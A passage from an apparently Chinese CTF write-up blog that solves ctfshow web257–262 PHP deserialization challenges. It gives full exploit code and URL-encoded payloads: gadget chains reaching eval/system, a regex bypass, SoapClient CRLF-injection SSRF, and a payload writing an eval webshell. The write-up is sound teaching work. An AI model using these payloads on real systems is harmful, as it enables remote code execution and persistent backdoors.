class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($username) &amp;&amp; <span class="keyword">isset</span>($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    $user-&gt;login($username,$password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次多了几个类，还是先观察<code>ctfShowUser</code>类，反序列化的时候会先实例化<code>info</code>这个类，接着再销毁的时候调用类中的<code>getInfo</code>方法；很显然调用的是类<code>info</code>中的<code>getInfo</code>方法，而我们需要调用类<code>backDoor</code>中的<code>getInfo</code>方法，因为其中含有<code>eval</code>可以命令执行。所以我们把本来调用的类改成<code>backDoor</code>，payload如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $class=<span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $code=<span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行后得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22cat+flag.php%22%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web257/7%5DK%407ZP_%7BJB5GDQQD19AH82.png" alt=""></p>
<h3 id="web258"><a class="header-anchor" href="#web258">¶</a>web258</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $isVip=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> $class = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$u,$p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===$u&amp;&amp;<span class="keyword">$this</span>-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $user=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password=$_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($username) &amp;&amp; <span class="keyword">isset</span>($password))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $_COOKIE[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        $user = unserialize($_COOKIE[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    $user-&gt;login($username,$password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上一题的基础上对输入做了正则过滤<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web258/6%28U8F%258M4_MSU44UJ%29%258Q0Y.png" alt=""><br>
在数字前面加一个<code>+</code>号即可绕过正则</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $class=<span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code=<span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">echo</span> serialize($a).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行后得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%22cat+flag.php%22%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
<p>加上<code>+</code>号，需要url编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%22cat+flag.php%22%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web258/YPDGH3%40LKV3DU6MW%405RQ%7BTK.png" alt=""></p>
<h3 id="web259"><a class="header-anchor" href="#web259">¶</a>web259</h3>
<p>这题知识点也在我盲区之外，跟着合天的一篇文章学习：<a href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a> ，接下来我的很长，你忍一下~</p>
<p><strong>SoapClient</strong></p>
<blockquote>
<p>SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP是一</p>
<p>种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果</p>
<p>去调用了一个不存在的函数，会去调用 __call 方法</p>
</blockquote>
<p>调用不存在的方法，使<code>SoapClient</code>类去调用<code>__call</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>));</span><br><span class="line">    $b = serialize($a);</span><br><span class="line">    <span class="keyword">echo</span> $b;</span><br><span class="line">    $c = unserialize($b);</span><br><span class="line">    $c-&gt;dotast();</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/0.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/2.png" alt=""></p>
<p><strong>CRLF漏洞</strong></p>
<blockquote>
<p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS</p>
</blockquote>
<p>在上面的图中，我们可以看到，<code>SOAPAction</code>是可控的点，我们注入两个<code>\r\n</code>来控制POST请求头</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;aaa\r\n\r\nbbb\r\n&quot;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>));</span><br><span class="line">    $b = serialize($a);</span><br><span class="line">    <span class="keyword">echo</span> $b;</span><br><span class="line">    $c = unserialize($b);</span><br><span class="line">    $c-&gt;dotast();</span><br></pre></td></tr></table></figure>
<p>执行后可以看到成功控制了请求头</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/image-20210829165019106.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/image-20210829165048219.png" alt="">但还有一个问题需要解决，POST数据指定请求头为<code>Content-Type:application/x-www-form-urlencoded</code>，我们需要控制<code>Content-Type</code>，但从上图中可以发现它位于<code>SOAPAtion</code>上方。<br>
继续往上，可以发现<code>User-Agent</code>位于<code>Content-Type</code>上方，这个位置也可以进行注入，所以我们再<code>User-Agent</code>进行注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$post_string = <span class="string">&quot;dotast=cool&quot;</span>;</span><br><span class="line">    $a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>, <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;dotast\r\nContent-Type:application/x-www-form-urlencoded\r\n&quot;</span>.<span class="string">&quot;Content-Length: &quot;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&quot;\r\n\r\n&quot;</span>.$post_string, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;aaa&quot;</span>));</span><br><span class="line">    $b = serialize($a);</span><br><span class="line">    <span class="keyword">echo</span> $b;</span><br><span class="line">    $c = unserialize($b);</span><br><span class="line">    $c-&gt;dotast();</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/%40%40N4MY7%28%29%24VPJK%5BT%287OJ%40%24C.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/651651651.png" alt=""><br>
如图，构造任意post请求成功！到此，一系列流程都弄懂后，我们回到题目本身<br>
<strong>flag.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$xff = explode(<span class="string">&#x27;,&#x27;</span>, $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">array_pop($xff);</span><br><span class="line">$ip = array_pop($xff);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ip!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$token = $_POST[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>($token==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">		file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,$flag);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>index.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$vip = unserialize($_GET[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line">$vip-&gt;getFlag();</span><br></pre></td></tr></table></figure>
<p>相关参数都给足了，利用ssrf访问flag.php，然后构造post数据<code>token=ctfshow</code>还有xff请求头，paylaod如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$post_string = <span class="string">&quot;token=ctfshow&quot;</span>;</span><br><span class="line">    $a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>, <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;dotast\r\nContent-Type:application/x-www-form-urlencoded\r\n&quot;</span>.<span class="string">&quot;X-Forwarded-For: 127.0.0.1,127.0.0.1\r\n&quot;</span>.<span class="string">&quot;Content-Length: &quot;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&quot;\r\n\r\n&quot;</span>.$post_string, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;aaa&quot;</span>));</span><br><span class="line">    $b = serialize($a);</span><br><span class="line">    <span class="keyword">echo</span> urlencode($b);</span><br></pre></td></tr></table></figure>
<p>这里<code>X-Forwarded-For</code>里面需要两个<code>127.0.0.1</code>的原因是docker环境cloudfare代理所导致，具体可参考这篇文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;support.cloudflare.com&#x2F;hc&#x2F;zh-cn&#x2F;articles&#x2F;200170986-Cloudflare-%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86-HTTP-%E8%AF%B7%E6%B1%82%E6%A0%87%E5%A4%B4-</span><br></pre></td></tr></table></figure>
<p>运行php<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/3P2RS_%28_OD3MNXDOSSRMAQ5.png" alt="">get参数<code>vip</code>传入<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/PQDH%7DSL4M%40T%28U%5D%5DYSS%5D%5BDVI.png" alt="">再访问flag.txt就有了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web259/H%7DCHET11SKQYTIBD59X9%25UL.png" alt=""></p>
<h3 id="web260"><a class="header-anchor" href="#web260">¶</a>web260</h3>
<p>水题吧这是…</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,serialize($_GET[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接传<code>?ctfshow=/ctfshow_i_love_36D/</code>就出flag</p>
<h3 id="web261"><a class="header-anchor" href="#web261">¶</a>web261</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $code;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$u,$p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=$u;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="keyword">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=$data[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$data[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            file_put_contents(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>观察代码，可以发现<code>__invoke</code>有命令执行，<code>__destruct</code>有文件写入；注意到有一个<code>__unserialize</code>魔术方法<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web261/N6BRWVT.png" alt=""><br>
显然</p>
<blockquote>
<p>如果 <code>__unserialize()</code> 和 <code>__wakeup()</code>两个魔术方法都定义在用一个对象中， 则只有<code> __unserialize()</code> 方法会生效，<code>__wakeup()</code> 方法会被忽略。</p>
</blockquote>
<p>所以我们只用观察<code>__unserialize</code>魔术方法，可以发现将传进的<code>username</code>和<code>password</code>会拼接到<code>code</code>中，而在<code>__destruct</code>中会判断<code>code</code>，接着写入文件<br>
很明显这里是一个弱比较，直接构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="comment">//0x36d等于十进制877</span></span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">&quot;877.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">&#x27;&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> ctfshowvip();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>执行后直接传入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?vip&#x3D;O%3A10%3A%22ctfshowvip%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A30%3A%22%3C%3Fphp+%40eval%28%24_POST%5Bdotast%5D%29%3B%3F%3E%22%3B%7D</span><br></pre></td></tr></table></figure>
<p>写入webshell之后，去获取flag<img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web261/E.png" alt=""></p>
<h3 id="web262"><a class="header-anchor" href="#web262">¶</a>web262</h3>
<p>本题考的是一个简单的反序列化字符串逃逸，在看题之前，我们简单了解一下知识点，我们先看一段代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> test();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">var_dump($b);</span><br></pre></td></tr></table></figure>
<p>运行后</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">67</span>) <span class="string">&quot;O:4:&quot;</span>test<span class="string">&quot;:2:&#123;s:8:&quot;</span>username<span class="string">&quot;;s:4:&quot;</span>user<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:4:&quot;</span>user<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果我们构造user中的内容，即</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$c = <span class="string">&#x27;O:4:&quot;test&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;user&quot;;s:8:&quot;password&quot;;s:4:&quot;test&quot;;&#125;user&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize($c));</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web262/%24F7%60OR_D%7D%5DFLNKJF1%40%29U__W.png" alt=""><br>
很显然，<code>user</code>被替换成了<code>test</code>，而后面的<code>user&quot;;&#125;</code>则被忽略</p>
<p>再回到题目本身</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $from;</span><br><span class="line">    <span class="keyword">public</span> $msg;</span><br><span class="line">    <span class="keyword">public</span> $to;</span><br><span class="line">    <span class="keyword">public</span> $token=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$f,$m,$t</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = $f;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = $m;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$f = $_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">$m = $_GET[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line">$t = $_GET[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($f) &amp;&amp; <span class="keyword">isset</span>($m) &amp;&amp; <span class="keyword">isset</span>($t))&#123;</span><br><span class="line">    $msg = <span class="keyword">new</span> message($f,$m,$t);</span><br><span class="line">    $umsg = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize($msg));</span><br><span class="line">    setcookie(<span class="string">&#x27;msg&#x27;</span>,base64_encode($umsg));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>注释提示了<code>message.php</code>，我们再访问一下<code>message.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $from;</span><br><span class="line">    <span class="keyword">public</span> $msg;</span><br><span class="line">    <span class="keyword">public</span> $to;</span><br><span class="line">    <span class="keyword">public</span> $token=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$f,$m,$t</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = $f;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = $m;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    $msg = unserialize(base64_decode($_COOKIE[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>($msg-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>梳理一下代码逻辑，有一个正则会把传入的序列化内容中的<code>fuck</code>替换成<code>loveU</code>，也就是长度从4变成了5，我们可以操作的内容就多了一位，并且只要<code>message</code>类中的<code>token</code>的值为<code>admin</code>，就会输出flag，所以我们的payload需要如下形式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>构造的payload长度一共27位，所以我们需要输入27个<code>fuck</code>来获得额外的27个长度，以达到填充我们的字符的目的，最后payload如下</p>
